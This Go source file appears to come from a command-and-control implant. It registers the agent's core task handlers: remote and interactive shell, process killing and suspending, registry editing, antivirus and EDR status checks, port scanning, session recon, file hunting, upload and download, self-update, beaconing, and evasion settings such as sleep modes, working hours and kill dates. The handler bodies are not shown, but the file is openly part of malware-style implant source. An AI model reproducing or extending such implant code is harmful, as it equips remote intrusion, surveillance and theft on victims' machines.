//go:build linux || windows || darwin
// +build linux windows darwin

package main

// taskHandler processes an agent task and populates the result.
type taskHandler func(Task, *TaskResult)

// taskHandlers maps task type strings to their handler functions.
var taskHandlers = map[string]taskHandler{}

// init binds the core command surface — everything that stays in the agent no
// matter which optional modules the operator selected at generation time
// (see internal/payload/agent_modules.go for the module catalogue; optional
// commands live in task_registry_<module>.go and are dropped with their
// module).
//
// mkdir/rename/chmod/hostinfo/help are bound via RegisterTask in
// task_registry_v2.go — the single-declaration idiom.
func init() {
	taskHandlers = map[string]taskHandler{
		"abort":             handleAbort,
		"shell":             handleShell,
		"ps":                handlePS,
		"process_tree":      handleProcessTree,
		"suspend":           handleSuspend,
		"resume":            handleResume,
		"killproc":          handleKillProc,
		"find":              handleFind,
		"reg_get":           handleRegGet,
		"reg_set":           handleRegSet,
		"reg_delete":        handleRegDelete,
		"reboot":            handleReboot,
		"wallpaper":         handleWallpaper,
		"shutdown":          handleShutdown,
		"drives":            handleDrives,
		"beacon_now":        handleBeaconNow,
		"services":          handleServices,
		"portscan":          handlePortscan,
		"netstat":           handleNetstat,
		"users":             handleUsers,
		"av":                handleAV,
		"download_url":      handleDownloadURL,
		"uninstall":         handleUninstall,
		"set_sleep":         handleSetSleep,
		"kill":              handleKill,
		"self_update":       handleSelfUpdate,
		"set_sleep_mode":    handleSetSleepMode,
		"get_sleep_mode":    handleGetSleepMode,
		"profile_rotate":    handleProfileRotate,
		"config_push":       handleConfigPush,
		"set_working_hours": handleSetWorkingHours,
		"set_kill_date":     handleSetKillDate,
		"clear_kill_date":   handleClearKillDate,
		"edr_status":        handleEdrStatus,
		"set_c2_mode":       handleSetC2Mode,
		"run_egress":        handleRunEgress,
		"file_hunt":         handleFileHunt,
		"file_search":       handleFileSearch,
		"session_recon":     handleSessionRecon,
		"ls":                handleLS,
		"delete":            handleDelete,
		"read":              handleRead,
		"download":          handleDownload,
		"upload":            handleUpload,

		// Interactive Shell
		"interactive_shell_start": handleInteractiveShellStart,
		"interactive_shell_write": handleInteractiveShellWrite,
		"interactive_shell_stop":  handleInteractiveShellStop,
	}
}
